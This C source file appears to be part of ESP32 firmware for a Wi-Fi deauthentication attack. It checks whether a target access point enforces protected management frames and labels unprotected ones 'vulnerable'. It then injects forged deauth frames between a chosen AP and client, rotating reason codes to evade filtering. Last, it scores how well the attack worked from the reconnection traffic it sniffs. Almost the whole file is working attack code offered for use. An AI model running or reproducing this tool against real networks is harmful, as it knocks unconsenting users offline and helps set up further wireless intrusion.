#include "test_deauth.h"

static const char *TAG = "TEST_DEAUTH";

// Statistics effectiveness
static deauth_effectiveness_t effectiveness_stats = {0};
static bool monitor_mode = false;
static uint8_t monitoring_phase = 0; // 0=baseline, 1=attack, 2=post-attack

// Callback to monitor packets
static void IRAM_ATTR wifi_sniffer_packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!monitor_mode) return;
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint8_t frame_type = frame[0];

    // ======= RETRIEVE DATA =======
    uint8_t attack_channel = deauth_get_attack_channel();
    const uint8_t *target_client = deauth_get_client_target();
    
    // Vérifier si c'est sur le bon canal
    if (pkt->rx_ctrl.channel != attack_channel) return;
    
    switch (frame_type) {
        // Dans le sniffer, analyser les beacon frames
        // Frame type 0x80 = Beacon
        case 0x80: { // Beacon frame
            // Vérifier que c'est bien l'AP cible
            const uint8_t *target_ap = deauth_get_ap_target();
            if (memcmp(&frame[10], target_ap, 6) != 0) break;

            // Compter les beacons pour confirmer que l'AP est à portée
            effectiveness_stats.beacon_baseline++;

            if (effectiveness_stats.pmf_checked) break;

            // Les fixed fields d'un beacon font 12 bytes (header 802.11)
            // + 8 bytes timestamp + 2 bytes interval + 2 bytes capabilities
            // = on commence à chercher les IEs à l'offset 36
            const uint8_t *ie = &frame[36];
            int remaining = pkt->rx_ctrl.sig_len - 36;

            while (remaining > 2) {
                uint8_t tag_id  = ie[0];
                uint8_t tag_len = ie[1];

                if (tag_id == 0x30 && tag_len >= 4) { // RSN IE
                    // RSN IE structure :
                    // 2 bytes version
                    // 4 bytes Group Cipher Suite
                    // 2 bytes Pairwise Cipher Suite Count
                    // N bytes Pairwise Cipher Suites
                    // 2 bytes AKM Suite Count
                    // N bytes AKM Suites
                    // 2 bytes RSN Capabilities  <-- c'est là qu'on veut

                    // Parser dynamiquement pour trouver RSN Capabilities
                    const uint8_t *rsn = &ie[2];
                    int rsn_remaining = tag_len;

                    rsn += 2; rsn_remaining -= 2; // skip version
                    if (rsn_remaining < 4) break;
                    rsn += 4; rsn_remaining -= 4; // skip Group Cipher Suite

                    if (rsn_remaining < 2) break;
                    uint16_t pairwise_count = rsn[0] | (rsn[1] << 8);
                    rsn += 2; rsn_remaining -= 2;

                    uint16_t skip = pairwise_count * 4;
                    if (rsn_remaining < skip + 2) break;
                    rsn += skip; rsn_remaining -= skip; // skip Pairwise Cipher Suites

                    uint16_t akm_count = rsn[0] | (rsn[1] << 8);
                    rsn += 2; rsn_remaining -= 2;

                    skip = akm_count * 4;
                    if (rsn_remaining < skip + 2) break;
                    rsn += skip; rsn_remaining -= skip; // skip AKM Suites

                    // RSN Capabilities
                    uint16_t rsn_caps = rsn[0] | (rsn[1] << 8);
                    uint8_t mfpc = (rsn_caps >> 7) & 1; // bit 7 = MFPC
                    uint8_t mfpr = (rsn_caps >> 6) & 1; // bit 6 = MFPR

                    effectiveness_stats.pmf_capable  = mfpc;
                    effectiveness_stats.pmf_required = mfpr;

                    char pmf_status[128];
                    if (mfpr) {
                        snprintf(pmf_status, sizeof(pmf_status),
                            "LOG|DEAUTH|msg=PMF=REQUIRED - target immune to deauth");
                        ESP_LOGW(TAG, "AP PMF REQUIRED - deauth will be ignored");
                    } else if (mfpc) {
                        snprintf(pmf_status, sizeof(pmf_status),
                            "LOG|DEAUTH|msg=PMF=OPTIONAL - deauth may work");
                        ESP_LOGW(TAG, "AP PMF OPTIONAL");
                    } else {
                        snprintf(pmf_status, sizeof(pmf_status),
                            "LOG|DEAUTH|msg=PMF=NONE - target vulnerable");
                        ESP_LOGI(TAG, "AP no PMF - vulnerable");
                    }
                    effectiveness_stats.pmf_checked = true;
                    BleManager_SendStatus(pmf_status);
                    break;
                }

                ie        += 2 + tag_len;
                remaining -= 2 + tag_len;
            }
            break;
        }
        case 0xB0: // Authentication frame
            if (monitoring_phase == 0) {
                effectiveness_stats.auth_baseline++;
            } else if (monitoring_phase == 2) {
                effectiveness_stats.auth_post_attack++;
                
                // Check whether it is the client target
                if (memcmp(&frame[10], target_client, 6) == 0 || 
                    memcmp(&frame[4], target_client, 6) == 0) {
                    ESP_LOGI(TAG, "Auth from TARGET client detected!");
                    BleManager_SendStatus("LOG|DEAUTH|msg=Target reconnecting!");
                }
            }
            break;
            
        case 0x20: // Reassociation Request
        case 0x00: // Association Request
            if (monitoring_phase == 2) {
                effectiveness_stats.reassoc_post_attack++;
            }
            break;
            
        case 0x40: // Probe Request
            if (monitoring_phase == 2) {
                effectiveness_stats.probe_req_post_attack++;
            }
            break;
            
        case 0xC0: // Deauth
            if (monitoring_phase == 2) {
                effectiveness_stats.deauth_post_attack++;
            }
            break;
    }
}

static void start_monitoring(void) {
    monitor_mode = true;

    // Get attack channel
    int attack_channel = deauth_get_attack_channel();
    
    // Configure promiscuous mode
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_packet_handler);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "Monitoring started on channel %d", attack_channel);
}

static void stop_monitoring(void) {
    monitor_mode = false;
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG, "Monitoring stopped");
}

static void analyze_effectiveness(void) {
    ESP_LOGI(TAG, "\n========== DEAUTH EFFECTIVENESS ANALYSIS ==========");
    ESP_LOGI(TAG, "Deauth packets sent: %lu", effectiveness_stats.deauth_sent);
    ESP_LOGI(TAG, "Baseline auth frames: %lu", effectiveness_stats.auth_baseline);
    ESP_LOGI(TAG, "Post-attack auth frames: %lu", effectiveness_stats.auth_post_attack);
    ESP_LOGI(TAG, "Post-attack reassoc frames: %lu", effectiveness_stats.reassoc_post_attack);
    ESP_LOGI(TAG, "Post-attack probe requests: %lu", effectiveness_stats.probe_req_post_attack);
    ESP_LOGI(TAG, "Post-attack deauth frames: %lu", effectiveness_stats.deauth_post_attack);
    
    // Score calculation
    int score = 0;
    float ratio = 0.0f;
    
    // Ratio aumentation auth frame
    if (effectiveness_stats.auth_baseline > 0) {
        ratio = (float)effectiveness_stats.auth_post_attack / effectiveness_stats.auth_baseline;
    } else if (effectiveness_stats.auth_post_attack > 0) {
        ratio = 999.0f; // no activity before baseline but activity after
    }
    
    // Scoring
    if (effectiveness_stats.auth_post_attack > 0) score += 3;
    if (effectiveness_stats.reassoc_post_attack > 0) score += 2;
    if (effectiveness_stats.probe_req_post_attack > 2) score += 1;
    if (ratio > 3.0f) score += 2; // Significant aumentation
    
    effectiveness_stats.effectiveness_score = (float)score / 8.0f * 100.0f;
    
    // Result
    char verdict[64];
    if (score >= 5) {
        strcpy(verdict, "[v] LIKELY SUCCESSFUL");
        effectiveness_stats.likely_successful = true;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    } else if (score >= 3) {
        strcpy(verdict, "[~] POSSIBLY SUCCESSFUL");
        effectiveness_stats.likely_successful = false;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    } else {
        strcpy(verdict, "[x] LIKELY FAILED");
        effectiveness_stats.likely_successful = false;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    }
    
    ESP_LOGI(TAG, "Auth increase ratio: %.2fx", ratio);
    ESP_LOGI(TAG, "===================================================\n");
    
    //Send result
    char result[256];
    snprintf(result, sizeof(result), 
        "LOG|DEAUTH|msg=Effectiveness: %s (%.0f%%) - Auth:%lu Reassoc:%lu",
        verdict, effectiveness_stats.effectiveness_score,
        effectiveness_stats.auth_post_attack,
        effectiveness_stats.reassoc_post_attack);
    BleManager_SendStatus(result);
}

static void deauth_with_test_task(void *vParameters) {
    ESP_LOGI(TAG, "\n========== STARTING EFFECTIVENESS TEST ==========");

    // Get target ap and client
    const uint8_t *target_ap = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();

    snifferActive = true;
    deauthActive = true;
    isAttackActive = true;
    
    // Reset stats
    memset(&effectiveness_stats, 0, sizeof(deauth_effectiveness_t));
    
    // PHASE 1: Baseline monitoring
    ESP_LOGI(TAG, "Phase 1: Baseline monitoring (2s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 1: Baseline monitoring...");
    monitoring_phase = 0;
    start_monitoring();
    vTaskDelay(pdMS_TO_TICKS(3000));
    stop_monitoring();
    
    ESP_LOGI(TAG, "Baseline: %lu auth frames detected", effectiveness_stats.auth_baseline);

    // Check if AP is in range
    if (effectiveness_stats.beacon_baseline == 0) {
        BleManager_SendStatus("LOG|DEAUTH|msg=ERROR - AP not in range, aborting");
        ESP_LOGE(TAG, "AP not detected in baseline - out of range or wrong channel");
        goto cleanup;
    }

    // Check PMF
    if (effectiveness_stats.pmf_required) {
        BleManager_SendStatus("LOG|DEAUTH|msg=ERROR - PMF required, target immune");
        ESP_LOGE(TAG, "PMF required - attack will fail");
        goto cleanup;  // Inutile d'attaquer
    }
    
    // PHASE 2: Attack
    ESP_LOGI(TAG, "Phase 2: Deauth attack (3s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 2: Sending deauth packets...");
    monitoring_phase = 1;
    
    send_deauth_packets_timed(target_ap, target_client, 5000); // milli
    
    ESP_LOGI(TAG, "Attack phase complete");
    
    // PHASE 3: Post-attack monitoring
    ESP_LOGI(TAG, "Phase 3: Post-attack monitoring (5s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 3: Monitoring responses...");
    monitoring_phase = 2;
    vTaskDelay(pdMS_TO_TICKS(100)); // laps before monitoring
    start_monitoring();
    vTaskDelay(pdMS_TO_TICKS(10000));
    stop_monitoring();
    
    ESP_LOGI(TAG, "Post-attack: %lu auth, %lu reassoc, %lu probe req", 
             effectiveness_stats.auth_post_attack,
             effectiveness_stats.reassoc_post_attack,
             effectiveness_stats.probe_req_post_attack);
    
    // PHASE 4: Analysis
    analyze_effectiveness();

cleanup:
    snifferActive = false;
    deauthActive = false;
    isAttackActive = false;
    
    // Cleanup
    deauth_set_task_handle(NULL);
    vTaskDelete(NULL);
}

void send_deauth_packets_timed(const uint8_t *ap_mac, const uint8_t *client_mac, uint32_t duration_ms) {
    // Get attack channel
    int attack_channel = deauth_get_attack_channel();

    ESP_LOGI(TAG, "Sending deauth bursts for %lu ms on channel %d", duration_ms, attack_channel);
    ESP_LOGI(TAG, "AP: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    // Prepare WiFi for injection
    prepare_for_injection();

    // Timer
    unsigned long start_time = esp_timer_get_time() / 1000; // milli
    unsigned long elapsed = 0;

    // Variables for deauth attack
    uint8_t packet[26];
    int total_count = 0;
    int success_count = 0;
    const int MAX_RETRIES = 3;

    // Bypass client filtering with different Reason codes
    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
    const int reason_count = sizeof(reason_codes);
    
    // Boucle limitée dans le temps
    while (deauthActive && elapsed < duration_ms) {
        // Send burst of 3 packets with retries on failure
        for (int burst = 0; burst < 3; burst++) {
            uint8_t reason = reason_codes[(total_count + burst) % reason_count];

            // ===== AP -> Client =====
            build_deauth_packet(packet, client_mac, ap_mac, ap_mac, reason);
            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
            vTaskDelay(pdMS_TO_TICKS(5));

            // ===== Client -> AP =====
            build_deauth_packet(packet, ap_mac, client_mac, ap_mac, reason);
            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
            vTaskDelay(pdMS_TO_TICKS(5));
        }

        // Inter-burst
        vTaskDelay(pdMS_TO_TICKS(50));
        
        // Update elapsed time
        elapsed = (esp_timer_get_time() / 1000) - start_time;
        
        // Log progress every 10 bursts
        if ((total_count + 1) % 10 == 0) {
            ESP_LOGI(TAG, "Progress: %d bursts, %d packets sent (%lu ms elapsed)", 
                     total_count + 1, success_count, elapsed);
        }
        total_count++;
    }

    effectiveness_stats.deauth_sent = success_count;
    
    ESP_LOGI(TAG, "Timed attack complete: %d packets sent in %lu ms", 
             success_count, elapsed);
    
    // Restore original WiFi state
    vTaskDelay(pdMS_TO_TICKS(200));
    restore_wifi_state();
}


void start_deauth_with_effectiveness_test(char *target, char *ap, int channel) {
    // Get deauth task handle
    TaskHandle_t deauth_task_handle = deauth_get_task_handle();

    if (deauthActive) {
        ESP_LOGW(TAG, "Deauth already running");
        return;
    }
    
    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task already exists");
        return;
    }
    
    uint8_t target_mac[6];
    uint8_t ap_mac[6];
    
    if (!mac_str_to_bytes(target, target_mac) || !mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid MAC format");
        return;
    }
    
    set_deauth_targets(ap_mac, target_mac);
    set_deauth_channel(channel);
    
    xTaskCreate(
        deauth_with_test_task,
        "deauth_test_task",
        8192,
        NULL,
        5,
        &deauth_task_handle
    );
    
    ESP_LOGI(TAG, "Deauth effectiveness test started");
}